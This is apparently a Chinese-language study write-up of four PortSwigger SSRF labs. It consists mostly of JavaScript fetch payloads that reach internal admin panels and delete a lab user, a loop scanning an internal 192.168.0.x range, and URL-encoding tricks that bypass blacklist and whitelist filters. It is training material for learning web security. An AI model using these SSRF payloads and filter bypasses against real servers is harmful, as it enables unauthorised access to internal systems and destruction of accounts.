---
title: PortSwigger Server-side request forgery (SSRF)
description: PortSwigger Server-side request forgery (SSRF)
---

## Lab: Basic SSRF against the local server

| Dimension | Description                                                                |
| --------- | -------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/ssrf#ssrf-attacks-against-the-server  |
| Lab       | https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost |

先

```js
fetch(
  "https://0a7d00ac03b61bf181870c00004b0025.web-security-academy.net/product/stock",
  {
    headers: {
      "content-type": "application/x-www-form-urlencoded",
    },
    body: "stockApi=http://localhost/admin",
    method: "POST",
    mode: "cors",
    credentials: "include",
  },
);
```

之後

```js
fetch(
  "https://0a7d00ac03b61bf181870c00004b0025.web-security-academy.net/product/stock",
  {
    headers: {
      "content-type": "application/x-www-form-urlencoded",
    },
    body: `stockApi=${encodeURIComponent("http://localhost/admin/delete?username=carlos")}`,
    method: "POST",
    mode: "cors",
    credentials: "include",
  },
);
```

是說我從來沒看過有人會把 API 設計成這樣 `stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=2&storeId=1`，然後 Lab 通關條件是要把 admin 的帳號刪掉，也太狠了吧（？而且只要一個 GET API 就能直接刪帳號，真的是有夠牛掰的設計（x

## Lab: Basic SSRF against another back-end system

| Dimension | Description                                                                           |
| --------- | ------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/ssrf#ssrf-attacks-against-other-back-end-systems |
| Lab       | https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system       |

寫一隻 for 迴圈來掃描

```js
let shouldBreak = false;
for (let i = 1; i <= 255; i++) {
  if (shouldBreak) break;
  setTimeout(
    () => {
      if (shouldBreak) return;
      fetch(
        "https://0ab200a80355f0ce80a4712e008c00b9.web-security-academy.net/product/stock",
        {
          headers: {
            "content-type": "application/x-www-form-urlencoded",
          },
          body: `stockApi=${encodeURIComponent(`http://192.168.0.${i}:8080/admin`)}`,
          method: "POST",
          mode: "cors",
          credentials: "include",
        },
      ).then((res) => {
        if (res.status === 200) {
          shouldBreak = true;
          console.log(i);
        }
      });
    },
    (i - 1) * 500,
  );
}
```

在 138 的時候停下

```js
fetch(
  "https://0ab200a80355f0ce80a4712e008c00b9.web-security-academy.net/product/stock",
  {
    headers: {
      "content-type": "application/x-www-form-urlencoded",
    },
    body: `stockApi=${encodeURIComponent(`http://192.168.0.138:8080/admin/delete?username=carlos`)}`,
    method: "POST",
    mode: "cors",
    credentials: "include",
  },
);
```

又要開始刪人家的帳號了XDD

## Lab: SSRF with blacklist-based input filter

| Dimension | Description                                                                       |
| --------- | --------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/ssrf#ssrf-with-blacklist-based-input-filters |
| Lab       | https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter          |

先嘗試

```js
fetch(`${location.origin}/product/stock`, {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: `stockApi=${encodeURIComponent(`http://localhost/admin`)}`,
  method: "POST",
  mode: "cors",
  credentials: "include",
});
```

=> `"External stock check blocked for security reasons"`

之後嘗試

```js
encodeURIComponent(`http://localhost`);
encodeURIComponent(`/admin`);
encodeURIComponent(`http://localhost/ADMIN`);
encodeURIComponent(`2130706433/admin`);
encodeURIComponent(`http://2130706433/admin`);
encodeURIComponent(`https://2130706433/admin`);
encodeURIComponent(`https://localhost/admin`);
encodeURIComponent(`http://127.1/admin`);
```

=> `"External stock check blocked for security reasons"`

最終嘗試

```js
encodeURIComponent(`http://127.1/%61dmin`);
```

然後就可以來刪帳號

```js
fetch(`${location.origin}/product/stock`, {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: `stockApi=${encodeURIComponent(`http://127.1/%61dmin/delete?username=carlos`)}`,
  method: "POST",
  mode: "cors",
  credentials: "include",
});
```

要注意 [encodeURIComponent](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/encodeURIComponent#description) 不會針對 `A–Z a–z 0–9 - _ . ! ~ * ' ( )` 去做 encode，所以我們可以寫一個 function 來達成

```js
function encodeSingleStringToURIComponent(str) {
  return "%" + str.charCodeAt(0).toString(16);
}
```

看來我對

- URL Encode 的機制
- IP 的不同表達方式
  還不夠了解，之後需要來補一下這方面的知識

## Lab: SSRF with whitelist-based input filter

| Dimension | Description                                                                       |
| --------- | --------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/ssrf#ssrf-with-whitelist-based-input-filters |
| Lab       | https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter          |

先嘗試

```js
encodeURIComponent(`http://localhost/admin`);
encodeURIComponent(`http://localhost/admin?fake=http://stock.weliketoshop.net`);
encodeURIComponent(
  `http://stock.weliketoshop.net:fakepassword@localhost/admin`,
);
encodeURIComponent(`http://localhost/admin#stock.weliketoshop.net`);
encodeURIComponent(`http://localhost/admin#http://stock.weliketoshop.net`);
encodeURIComponent(`http://localhost#@stock.weliketoshop.net/admin`);
encodeURIComponent(`http://stock.weliketoshop.net@localhost/admin`);
encodeURIComponent(`http://stock.weliketoshop.net.localhost/admin`);
encodeURIComponent(
  `http://stock.weliketoshop.net%2f..%2f..%2flocalhost%2fadmin`,
);
encodeURIComponent(`http://stock.weliketoshop.net%2523@localhost/admin`);
encodeURIComponent(`http://localhost%2523/admin@stock.weliketoshop.net`);
function encodeStringToURIComponent(str) {
  return str
    .split("")
    .map((char) => "%" + char.charCodeAt(0).toString(16))
    .join("");
}
encodeStringToURIComponent("http://localhost/admin");
encodeStringToURIComponent(
  `http://localhost/admin#http://stock.weliketoshop.net`,
);
encodeStringToURIComponent(
  `http://stock.weliketoshop.net:fakepassword@localhost/admin`,
);
```

=> `"External stock check host must be stock.weliketoshop.net"`

最終嘗試

```js
encodeURIComponent(`http://localhost%23@stock.weliketoshop.net/admin`);
```

成功看到 `http://localhost/admin` 回傳的 response，推測是

1. `http://localhost%23@stock.weliketoshop.net/admin` => host 是 stock.weliketoshop.net，通過檢查 ✅
2. URL Decode 之後 `http://localhost#@stock.weliketoshop.net/admin`
3. `#@stock.weliketoshop.net` 被視為 fragment
4. `/admin` 是合法的 path
5. 最終請求 `http://localhost/admin`

之後再

```js
fetch(`${location.origin}/product/stock`, {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: `stockApi=${encodeURIComponent(`http://localhost%23@stock.weliketoshop.net/admin/delete?username=carlos`)}`,
  method: "POST",
  mode: "cors",
  credentials: "include",
});
```

後來回頭看官方解答，真的很精妙 `http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos`

`localhost:80%2523` => 雙重 URL Decode 之後 => `localhost:80#` => 利用 `localhost:80` 巧妙的跟 `username:password` 匹配

## 參考資料

- https://portswigger.net/web-security/ssrf
